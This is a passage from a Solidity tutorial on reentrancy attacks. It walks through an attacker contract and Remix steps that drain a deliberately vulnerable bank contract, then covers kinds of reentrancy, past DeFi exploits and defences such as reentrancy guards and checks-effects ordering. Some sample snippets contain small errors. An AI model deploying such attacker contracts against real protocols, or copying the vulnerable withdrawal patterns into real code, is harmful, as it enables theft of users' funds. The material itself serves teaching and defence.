class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    constructor(address _thebankAddress) {</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        theBank = TheBank(_thebankAddress);</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    }</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    receive() external payable {</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        if (address(theBank).balance &gt;= 1 ether) {</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">            theBank.withdrawal();</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        }</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    }</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    function attack() external payable {</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        require(msg.value &gt;= 1 ether);</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        theBank.deposit{value: 1 ether}();</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        theBank.withdrawal();</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    }</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    function getBalances() public view returns (uint) {</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        return address(this).balance;</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    }</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Having done all this, it is time to compile and deploy the codes; you can do this on Remix or VScode.  </p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="deploying-the-smart-contracts-and-testing-reentrancy">Deploying the Smart Contracts and Testing Reentrancy<a href="#deploying-the-smart-contracts-and-testing-reentrancy" class="hash-link" aria-label="Direct link to Deploying the Smart Contracts and Testing Reentrancy" title="Direct link to Deploying the Smart Contracts and Testing Reentrancy">​</a></h4><p><strong>Step 1: Deploy TheBank Contract<br></strong>  </p><p>You need to deploy this first.  </p><p><img loading="lazy" src="/guides/assets/images/0-b2cfc5b4ed96cf58e0ead59b7d1dbb47.png" width="259" height="512" class="img_ev3q"></p><p><strong>Step 2: Deploy TheAttacker Contract<br></strong>  </p><p>Select a different account or address, then you can deploy this contract with the contract address of TheBank contract in the constructor.  </p><p><img loading="lazy" src="/guides/assets/images/1-1575f2d79887d7c60fefc99a7f3189a2.png" width="258" height="512" class="img_ev3q"></p><p><strong>Step 3: Deposit into TheBank Contract<br></strong>  </p><p>Deposit 7 Ether into The Bank  </p><p><img loading="lazy" src="/guides/assets/images/2-839f9dd38a5cc3c47b3a87992a7a9f47.png" width="316" height="512" class="img_ev3q"></p><p><strong>Step 4: Try to Deposit 1 Ether into TheAttacker Contract<br></strong>  </p><p>Select the other account or address that you used to deploy the attacker contract and try to deposit 1 Ether.  </p><p><img loading="lazy" src="/guides/assets/images/3-472852b26e2b722826f462e18442b113.png" width="393" height="339" class="img_ev3q"></p><p>When you call the attack function with a deposit of 1 Ether, you get 8 total Ethers at the end of the day; you have successfully carried out a reentrancy attack!  </p><p>The next section covers the different types of reentrancy attacks.  </p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="types-of-reentrancy-attacks">Types of Reentrancy Attacks<a href="#types-of-reentrancy-attacks" class="hash-link" aria-label="Direct link to Types of Reentrancy Attacks" title="Direct link to Types of Reentrancy Attacks">​</a></h2><p>There is no monolithic way to reenter a contract; it all depends on the peculiarity of each contract. Therefore, there is a need for ingenuity to deduce the most practical way to attack each contract with reentrancy.  </p><p>Reentrancy attacks can come in these forms:  </p><p><strong>Mono-Function Reentrancy</strong>  </p><p>One vulnerable function can wreck an entire contract. This is why it is good to audit your code line by line. Take this function, for example:  </p><div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">function withdrawal() public {</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    require(theBalances[msg.sender] &gt;= 1 ether, "you must have at least one ether");</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    uint bal = theBalances[msg.sender];</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    (bool success, ) = msg.sender.call{value: bal} ("");</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    require(success, "transaction failed");</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    theBalances[msg.sender] -= 0;</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" class="clean-btn" aria-label="Toggle word wrap" title="Toggle word wrap"><svg class="wordWrapButtonIcon_Bwma" viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M4 19h6v-2H4v2zM20 5H4v2h16V5zm-3 6H4v2h13.25c1.1 0 2 .9 2 2s-.9 2-2 2H15v-2l-3 3l3 3v-2h2c2.21 0 4-1.79 4-4s-1.79-4-4-4z"></path></svg></button><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The vulnerability here is that the balance was not updated before sending Ether, but after it. If this function were to be in a contract, an attacker could leverage it.  </p><p><strong>Cross-Function Reentrancy<br></strong>  </p><p>Once two or more functions share the same state variables, the weakness of any one of them can give the attacker the power to attack other vital functions even though they might have been secured to an extent.  </p><div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">mapping(address =&gt; uint) private theBalances;</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">function withdrawalAll() external noReentrant {</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    uint balance = getUserBalance(msg.sender);</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    require(balance &gt; 1 ether, "must have a balance of 1 ether or more");</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    (bool success, ) = msg.sender.call{value: balance} ("");</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    require(success, "transaction failed");</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    theBalances[msg.sender] = 0;</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">}</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">function transfer(address _recipient, uint _theAmount) external payable {</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">   if(theBalances[msg.sender] &gt;= _theAmount) {</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">       theBalances[_recipient] += _theAmount;</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">       theBalances[msg.sender] -= _theAmount;</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">   }</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The <strong>withdrawal</strong> function is partly secure because it has the reentrancy guard, but there is a loophole: the developer did not update the state before executing the effect of the check.  </p><p>Therefore, right from the transfer line in the <strong>withdrawAll</strong> function, an attacker can call the <strong>transfer</strong> function itself. Meanwhile, note that the transfer function has no security at all.  </p><p>With this, an attacker can withdraw and still transfer tokens within the same interval and most likely siphon all the funds. A small loophole in the <strong>withdrawAll</strong> function opened the door to a bigger vulnerability, which explains how cross-function reentrancy occurs.  </p><p><strong>Cross-contract Reentrancy<br></strong>  </p><p>Cross-contract reentrancy works similarly to cross-function reentrancy. In a cross-contract reentrancy attack, it must be the case that two contracts share the same state.  </p><p>The actual vulnerability will occur when the state is not updated to reflect immediate transactional changes before any low-level or high-level cross-contract call.  </p><p><strong>Delegated Reentrancy<br></strong>  </p><p>At a low-level, when contract X successfully places a <strong>delegatecall</strong> to contract Y, the call gives the former access to run the codes of the latter. However, we must underscore that <strong>delegatecall</strong> does not call the state of the other contract.  </p><p>The EVM will only execute the state variables of the calling contract. Back to reentrancy, if it were to be the case that a <strong>delegatecall</strong> was made to a weak contract or library, an attacker can manipulate the destination and reenter.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="examining-a-few-contracts-that-were-exploited-with-reentrancy-in-the-past">Examining A Few Contracts That Were Exploited with Reentrancy in the Past<a href="#examining-a-few-contracts-that-were-exploited-with-reentrancy-in-the-past" class="hash-link" aria-label="Direct link to Examining A Few Contracts That Were Exploited with Reentrancy in the Past" title="Direct link to Examining A Few Contracts That Were Exploited with Reentrancy in the Past">​</a></h2><p>As one of the oldest and perhaps the most common form of attacker Ethereum smart contracts, reentrancy manipulation has spelled the end of most DeFi projects.  </p><p>Let us examine a few in no particular order:  </p><p><a href="https://github.com/pcaversaccio/reentrancy-attacks/issues/1" target="_blank" rel="noopener noreferrer">WETH Attack</a>  </p><p>Unlike the usual assumption that the DAO hack was the first hack in blockchain, the WETH attack was indeed the first. However, it was an intentional reentrancy hack to save the project from possible occasions of reentrancy by attackers.  </p><p><a href="https://nipunp.medium.com/5-8-21-rari-capital-exploit-timeline-analysis-8beda31cbc1a" target="_blank" rel="noopener noreferrer">Rari Capital Attack</a>  </p><p>Rari Capital is a popular DeFi lending and yield protocol. In May 2021, an attacker exploited the contract by taking a big loan from dYdX, then manipulating the <strong>approval</strong> function, making some gains, and repeating the process until they siphoned 2,600 Ether in less than one hour.  </p><p><a href="https://inspexco.medium.com/reentrancy-attack-on-cream-finance-incident-analysis-1c629686b6f5" target="_blank" rel="noopener noreferrer">Cream Finance</a>  </p><p>The attacker of Cream Finance crept in through the loophole in the <strong>doTransferOut</strong> function of the contract. The attacker borrowed some tokens and successfully jumped repayment.  </p><p><a href="https://certik.medium.com/fei-protocol-incident-analysis-8527440696cc" target="_blank" rel="noopener noreferrer">Fei Protocol</a>  </p><p>The exploitative flow of Fei Protocol was quite similar to how blackhats reentered the Cream Finance contract. The hacker took a flash loan to borrow almost $2k USDC on Fei Protocol, bypassed payment, got their loan back, then repeated the process again.  </p><p><a href="https://twitter.com/BlockSecTeam/status/1546141457933025280" target="_blank" rel="noopener noreferrer">BurgerSwap Protocol Attack</a>  </p><p>As an NFT lending protocol, the attacker used NFTs to borrow wrapped Ether from the protocol. Unfortunately for the attacker, the protocol was in beta, so there were no real funds in the pool.  </p><p><a href="https://www.coindesk.com/tech/2022/03/31/ola-finance-exploited-for-36m-in-re-entrancy-attack/" target="_blank" rel="noopener noreferrer">Ola Finance</a>  </p><p>The attacker contract borrowed some money as collateral to take a loan on the Ola Finance protocol. As the code was executing, the attacker contract could successfully remove the collateral and still go away with the borrowed funds.  </p><p><a href="https://blocksecteam.medium.com/when-safemint-becomes-unsafe-lessons-from-the-hypebears-security-incident-2965209bda2a" target="_blank" rel="noopener noreferrer">HypeBears Attack</a>  </p><p>Like other NFT contracts, the HypeBears contract used the ERC-721 standard. However, the attacker manipulated the safeMint function to fire the fallback function and reenter the contract multiple times.  </p><p><a href="https://www.certik.com/resources/blog/4mPLWLwyKG4xy30x65uLgw-paraluni-exploit" target="_blank" rel="noopener noreferrer">Paraluni Attack</a>  </p><p>The Paraluni attack was a phenomenal one. When the attacker contract maneuvered the <strong>depositByAddLiquidity</strong> function to twist the ID, reentered and took away almost $2 million.  </p><p><a href="https://therecord.media/2-million-stolen-from-defi-protocol-revest-finance-platform-unable-to-reimburse-victims/" target="_blank" rel="noopener noreferrer">Revest Finance Protocol Hack</a>  </p><p>What happened in this hack was a typical example of cross-function reentrancy. The attacker spotted a weak function that is interdependent on others and got away with $2 million.  </p><p><a href="https://polydex.medium.com/plx-locker-smart-contract-incident-post-mortem-75342124a3e8" target="_blank" rel="noopener noreferrer">PolyDex Hack</a>  </p><p>According to the post-mortem report that the team released, the attacker contract triggered the <strong>tokenReceived</strong> function and emptied the locked contract.  </p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="how-to-prevent-reentrancy-vulnerabilities-in-solidity">How to Prevent Reentrancy Vulnerabilities in Solidity<a href="#how-to-prevent-reentrancy-vulnerabilities-in-solidity" class="hash-link" aria-label="Direct link to How to Prevent Reentrancy Vulnerabilities in Solidity" title="Direct link to How to Prevent Reentrancy Vulnerabilities in Solidity">​</a></h2><p>Many protocols have lost an unfortunate amount of funds to reentrancy attacks. As a result, the Ethereum core team came up with helpful tips, and some other security experts have developed smart contract best practices to boycott reentrancy.  </p><p><strong>Reentrancy Guard</strong>  </p><p>An attacker can reenter because they can make more than one function run at a time. The reentrancy guard solves this as it stops the execution of multiple vital functions at the same time.  </p><div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">bool internal locked;</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">modifier noReentrant() {</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    require(!locked, "cannot reenter");</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    locked = true;</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    _;</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    locked = false;</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">}</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">function withdrawalAll() external noReentrant {</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    uint balance = getUserBalance(msg.sender);</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    require(balance &gt; 1 ether, "your balance ould be 1 ether or more");</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    (bool success, ) = msg.sender.call{value: balance} ("");</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    require(success, "transaction failed");</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    theBalances[msg.sender] = 0;</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>To create the reentrancy guard, you will first create a boolean variable. Then make a modifier; put a check in the modifier, set it to false, and set it to true after execution.  </p><p>If you would like to use it to guard a function, input it in the right after the scope as a modifier. As an alternative, you can import <a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol" target="_blank" rel="noopener noreferrer">the Reentrancy Guard implementation of OpenZeppelin</a>.  </p><p><strong>Check and Effects Convention<br></strong>  </p><p>Can you remember the illustration of the bank we gave at the beginning of this guide? The flaw of the bank was that it did not ascertain the current balance of the customer before allowing withdrawal.  </p><p>With the Check and Effects convention, you must ensure that you update the balances before allowing any external call placement.  </p><p>Instead of having your vital function like this:  </p><div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">function withdrawalAll() external noReentrant {</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    uint balance = getUserBalance(msg.sender);</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    require(balance &gt; 1 ether, "your balance ould be 1 ether or more");</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    (bool success, ) = msg.sender.call{value: balance} ("");</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    require(success, "transaction failed");</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    theBalances[msg.sender] = 0;</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>It should rather be this way:  </p><div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">function withdrawalAll() external noReentrant {</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    uint balance = getUserBalance(msg.sender);</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    require(balance &gt; 1 ether, "your balance ould be 1 ether or more");</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    theBalances[msg.sender] = 0;</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    (bool success, ) = msg.sender.call{value: balance} ("");</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    require(success, "transaction failed");</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>You must update your state immediately after you have set the requirement check, and this is the reason you should be mindful of the execution flow of your contract.  </p><p><strong>Pull Payment Convention<br></strong>  </p><p>Reentrancy exploits are only possible when attacker contracts successfully interact with a victim contract. But what if there were a chasm that acts as an intermediary? In that case, the main logic of reentrancy is frustrated and rendered ineffective.  </p><p>In pull payment, the main contract sends funds into an escrow before they would be eventually disbursed, other things being equal. You can <a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/PullPayment.sol" target="_blank" rel="noopener noreferrer">interface the pull payment dependency</a> in your contract.  </p><p>At the same time, this posits a single point of failure; once the attacker infiltrates into the escrow itself, the main contract becomes susceptible ipso facto.  </p><p><strong>Emergency-Stop Pattern<br></strong>  </p><p>Developers are now humble enough to accept that no contract is perfect, no matter the reputation of both the developers and the auditors involved in it. Therefore, the best method is to prepare for any emergency.  </p><p>This is the reason behind the emergency-stop pattern, which some engineers call the Pausable Convention. With this pattern, you can put an arbitrary pause on the withdrawal the minute you notice something fishy.  </p><p>You can <a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.7.3/contracts/security/Pausable.sol" target="_blank" rel="noopener noreferrer">import it into your state</a> and comply with the rest of the implementation so it can work in your contract.  </p><p><strong>Smart Contract Testing &amp; Audits</strong></p><p>Testing is an important part of smart contract security. There are various ways to test your smart contract code, such as manual testing (e.g., executing function calls and checking values manually) or automatic testing (e.g., using scripts and methods such as fuzzing and unit tests). Regardless, we recommend getting a smart contract audit from a reputable auditor if you are deploying to mainnet.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="conclusion">Conclusion<a href="#conclusion" class="hash-link" aria-label="Direct link to Conclusion" title="Direct link to Conclusion">​</a></h2><p>Congratulations! We are sure you not only have a sophisticated understanding of how reentrancy works and how it can happen, but more importantly, you can write more secure contracts and give blackhats a tough time.  </p><p>Since you are here, you should also check out <a href="https://www.quicknode.com/guides/web3-sdks/how-to-build-your-dapp-using-the-modern-ethereum-tech-stack-hardhat-and-ethersjs" target="_blank" rel="noopener noreferrer">how to build Ethereum-based DApps with Hardhat using the Ether.js framework</a>.  </p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="we-love-feedback">We Love Feedback!<a href="#we-love-feedback" class="hash-link" aria-label="Direct link to We Love Feedback!" title="Direct link to We Love Feedback!">​</a></h4><p>You may have some questions or feedback on this reentrancy guide, <a href="https://airtable.com/shrKKKP7O1Uw3ZcUB?prefill_Guide+Name=A%20Broad%20Overview%20of%20Reentrancy%20Attack%20in%20Solidity%20Contracts" target="_blank" rel="noopener noreferrer">let us know</a>.  </p><p>Got ideas, questions, or want to show off what you have learned? Tell us on <a href="https://discord.gg/quicknode" target="_blank" rel="noopener noreferrer">Discord</a> or reach out to us via <a href="https://twitter.com/QuickNode" target="_blank" rel="noopener noreferrer">Twitter</a>. We'd love to hear from you!</p><div></div></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="grid md:grid-cols-2 gap-8 text-left border-t border-gray-200 pt-12 pb-4"><div class="theme-doc-footer-edit-meta-row"><h6 class="mb-1 Text-module_text__MaWZT Text-module_text--faint__hlitO text-md">Written by</h6><h3 class="Text-module_text__MaWZT text-xl font-medium">John Fáwọlé</h3><div class="col text-left pl-0 lastUpdated_VsjB"><span class="theme-last-updated">Last updated<!-- --> on <b><time datetime="2023-07-03T09:38:00.000Z">Jul 3, 2023</time></b></span><div></div></div></div><div><h6 class="mb-4 Text-module_text__MaWZT Text-module_text--faint__hlitO text-md">Share this <!-- -->guide</h6><div><ul class="flex"><li class="mr-2"><a class="relative border text-gray-700 hover:text-gray-900 dark:hover:text-gray-300 border-gray-200 transition duration-200 hover:border-gray-500 rounded-md p-2 h-10 w-10 flex items-center justify-center group cursor-pointer" href="https://twitter.com/intent/tweet?url=https://www.quicknode.com/guides/ethereum-development/smart-contracts/a-broad-overview-of-reentrancy-attacks-in-solidity-contracts" target="_blank" rel="noreferrer"><svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="" data-name="twitter" type="system"><path fill-rule="evenodd" clip-rule="evenodd" d="M12.067 4.23115C12.0916 4.25485 12.1157 4.27906 12.1393 4.30378C12.1477 4.31265 12.1601 4.31666 12.1721 4.31425C12.2897 4.29063 12.4058 4.26273 12.5201 4.23073C12.9008 4.12423 13.2628 3.97229 13.5992 3.7813C13.6214 3.76872 13.6434 3.75598 13.6653 3.74307C13.6682 3.74137 13.6711 3.73967 13.674 3.73797C13.675 3.73739 13.6761 3.73833 13.6758 3.73942C13.6628 3.77982 13.6488 3.81975 13.6337 3.85918C13.5753 4.01233 13.5015 4.15797 13.4142 4.29425C13.3626 4.37489 13.3062 4.45225 13.2455 4.52595C13.1247 4.67273 13.2487 4.94987 13.4309 4.89549C13.6154 4.84042 13.7953 4.77461 13.9702 4.69851C13.9789 4.69474 13.9871 4.70459 13.9818 4.7124C13.7176 5.10239 13.3971 5.45359 13.0332 5.7515C12.9893 5.78744 12.9448 5.8226 12.8996 5.85697C12.8402 5.90225 12.8056 5.97323 12.8077 6.04796C12.8094 6.11125 12.8104 6.17499 12.8104 6.2389C12.8104 9.40906 10.3962 13.0657 5.9823 13.0657C5.39461 13.0657 4.82444 12.991 4.28055 12.8508C3.78881 12.7241 3.31855 12.5438 2.87625 12.3169C2.85045 12.3036 2.82473 12.2902 2.79912 12.2767C2.67561 12.2113 2.73652 12.0208 2.87625 12.0208C3.3659 12.0208 3.83854 11.9482 4.28389 11.8131C4.37734 11.7848 4.46958 11.7537 4.56053 11.7199C4.61154 11.701 4.66214 11.6812 4.71232 11.6606C5.1235 11.4919 4.97537 10.8535 4.60194 10.6125C4.48777 10.5388 4.38025 10.4557 4.28045 10.3643C4.20768 10.2977 4.13901 10.2266 4.0749 10.1515C4.07215 10.1483 4.06941 10.1451 4.06669 10.1419C3.96318 10.0194 3.87171 9.88647 3.79408 9.74492C3.69557 9.56528 3.8618 9.37094 4.06669 9.37094C4.28075 9.37094 4.48859 9.34315 4.68534 9.29C4.6886 9.28912 4.68844 9.28446 4.68514 9.28377C4.68387 9.28351 4.68259 9.28324 4.68132 9.28297C4.5195 9.24909 4.36364 9.19892 4.21556 9.13426C4.165 9.11218 4.11536 9.08842 4.06669 9.06304C3.94048 8.99722 3.82085 8.92052 3.70904 8.83418C3.54305 8.706 3.39429 8.55657 3.26686 8.38996C3.19508 8.29611 3.13007 8.1968 3.07256 8.09276C3.0077 7.97544 2.95238 7.8521 2.90764 7.72379C2.82136 7.47631 2.77445 7.21033 2.77445 6.93332C2.77445 6.91972 2.78908 6.9111 2.80105 6.91756C2.81092 6.92288 2.82082 6.92813 2.83077 6.93332C3.12354 7.08599 3.45172 7.18089 3.80002 7.2009C3.81766 7.20191 3.82519 7.17906 3.81076 7.16887C3.80448 7.16443 3.79823 7.15997 3.792 7.15548C3.69809 7.0878 3.6093 7.01352 3.5263 6.93332C3.51594 6.9233 3.50566 6.9132 3.49548 6.903C3.3325 6.73977 3.19299 6.55324 3.08231 6.34885C3.00736 6.21044 2.94563 6.06384 2.89879 5.91075C2.8306 5.68792 2.79394 5.45132 2.79394 5.20615C2.79394 5.18349 2.79426 5.16091 2.79488 5.1384C2.796 5.09788 2.79812 5.05762 2.80122 5.01762C2.84141 4.49894 3.47298 4.42938 3.86063 4.77634C4.74078 5.56412 5.82631 6.12686 7.02707 6.37449C7.18791 6.40767 7.35082 6.43518 7.51558 6.45683C7.78939 6.49281 8.00188 6.23609 8.00188 5.95992C8.00188 5.80401 8.01675 5.65157 8.04515 5.50395C8.25816 4.39683 9.23217 3.56042 10.4018 3.56042C11.048 3.56042 11.6356 3.81565 12.067 